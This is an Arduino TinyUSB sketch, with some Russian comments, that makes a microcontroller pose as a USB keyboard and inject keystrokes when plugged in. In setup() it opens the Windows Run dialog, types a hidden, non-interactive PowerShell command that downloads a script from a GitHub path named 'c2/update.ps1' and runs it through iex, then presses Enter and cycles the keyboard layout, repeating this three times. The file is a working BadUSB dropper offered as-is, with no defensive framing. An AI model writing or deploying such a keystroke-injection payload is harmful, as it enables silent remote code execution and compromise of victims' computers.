#include "Adafruit_TinyUSB.h"

uint8_t const desc_hid_report[] = {
  TUD_HID_REPORT_DESC_KEYBOARD()
};

Adafruit_USBD_HID usb_hid(desc_hid_report, sizeof(desc_hid_report), HID_ITF_PROTOCOL_KEYBOARD, 2, false);

// Вспомогательная функция для печати текста
void sendString(const char* str) {
  for (int i = 0; str[i] != 0; i++) {

    uint8_t keycode[6] = {0};
    uint8_t mod = 0;
    uint8_t key = 0;

    char c = str[i];

    switch (c) {

      // ===== letters =====
      case 'a' ... 'z':
        key = HID_KEY_A + (c - 'a');
        break;

      case 'A' ... 'Z':
        key = HID_KEY_A + (c - 'A');
        mod = KEYBOARD_MODIFIER_LEFTSHIFT;
        break;

      // ===== numbers =====
      case '0': key = HID_KEY_0; break;
      case '1': key = HID_KEY_1; break;
      case '2': key = HID_KEY_2; break;
      case '3': key = HID_KEY_3; break;
      case '4': key = HID_KEY_4; break;
      case '5': key = HID_KEY_5; break;
      case '6': key = HID_KEY_6; break;
      case '7': key = HID_KEY_7; break;
      case '8': key = HID_KEY_8; break;
      case '9': key = HID_KEY_9; break;

      // ===== basic =====
      case ' ': key = HID_KEY_SPACE; break;
      case '\n': key = HID_KEY_ENTER; break;

      // ===== symbols =====
      case '!': key = HID_KEY_1; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case '@': key = HID_KEY_2; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case '#': key = HID_KEY_3; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case '$': key = HID_KEY_4; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case '%': key = HID_KEY_5; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case '^': key = HID_KEY_6; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case '&': key = HID_KEY_7; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case '*': key = HID_KEY_8; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case '(': key = HID_KEY_9; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
      case ')': key = HID_KEY_0; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case '-': key = HID_KEY_MINUS; break;
      case '_': key = HID_KEY_MINUS; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case '=': key = HID_KEY_EQUAL; break;
      case '+': key = HID_KEY_EQUAL; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case '[': key = HID_KEY_BRACKET_LEFT; break;
      case '{': key = HID_KEY_BRACKET_LEFT; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case ']': key = HID_KEY_BRACKET_RIGHT; break;
      case '}': key = HID_KEY_BRACKET_RIGHT; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case '\\': key = HID_KEY_BACKSLASH; break;
      case '|': key = HID_KEY_BACKSLASH; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case ';': key = HID_KEY_SEMICOLON; break;
      case ':': key = HID_KEY_SEMICOLON; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case '\'': key = HID_KEY_APOSTROPHE; break;
      case '"': key = HID_KEY_APOSTROPHE; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case ',': key = HID_KEY_COMMA; break;
      case '<': key = HID_KEY_COMMA; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case '.': key = HID_KEY_PERIOD; break;
      case '>': key = HID_KEY_PERIOD; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case '/': key = HID_KEY_SLASH; break;
      case '?': key = HID_KEY_SLASH; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;

      case '`': key = HID_KEY_GRAVE; break;
      case '~': key = HID_KEY_GRAVE; mod = KEYBOARD_MODIFIER_LEFTSHIFT; break;
    }

    // если символ не обработан — пропускаем
    if (key == 0 && mod == 0) continue;
    keycode[0] = key;
    usb_hid.keyboardReport(0, mod, keycode);
    delay(3);
    usb_hid.keyboardRelease(0);
    delay(3);
  }
}
void pressModifier(uint8_t modifier, uint16_t hold = 100, uint16_t pause = 200) {
  uint8_t empty[6] = {0};
  usb_hid.keyboardReport(0, modifier, empty);
  delay(hold);                 // удержание
  usb_hid.keyboardRelease(0);
  delay(pause);                // пауза после
}

void setup() {
  usb_hid.begin();

  while( !TinyUSBDevice.mounted() ) delay(1);
  
  delay(1500);

  // 1. Win + R
  uint8_t key_r[6] = { HID_KEY_R };
  usb_hid.keyboardReport(0, KEYBOARD_MODIFIER_LEFTGUI, key_r);
  delay(100);
  usb_hid.keyboardRelease(0);

  for (int i = 0; i < 3; i++) {
  delay(700);

  sendString("powershell -NoP -NonI -w h -c \"irm https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/update.ps1 | iex\"");
  delay(500);

  // 3. Нажимаем Enter
  uint8_t key_enter1[6] = { HID_KEY_ENTER };
  usb_hid.keyboardReport(0, 0, key_enter1);
  delay(100);
  usb_hid.keyboardRelease(0);
  delay(700);

  // 4. alt shift
  uint8_t key_space1[6] = { HID_KEY_SPACE };
  usb_hid.keyboardReport(0, KEYBOARD_MODIFIER_LEFTGUI, key_space1);
  delay(100);
  usb_hid.keyboardRelease(0);
  delay(1000);

  // 5. esc
  uint8_t key_esc1[6] = { HID_KEY_ESCAPE };
  usb_hid.keyboardReport(0, 0, key_esc1);
  delay(100);
  usb_hid.keyboardRelease(0);
  delay(500);
  }
}

void loop() {}